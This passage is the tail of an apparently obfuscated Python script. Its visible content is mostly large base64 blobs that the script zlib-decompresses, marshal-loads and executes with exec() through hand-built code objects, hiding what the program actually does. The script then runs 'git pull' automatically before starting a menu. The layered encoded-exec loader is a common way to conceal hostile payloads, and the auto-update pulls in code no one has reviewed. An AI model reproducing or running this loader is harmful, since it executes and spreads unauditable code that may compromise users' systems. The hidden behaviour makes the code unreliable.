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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
    
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
		
if __name__=="__main__":
	os.system("git pull")
	menu()
































































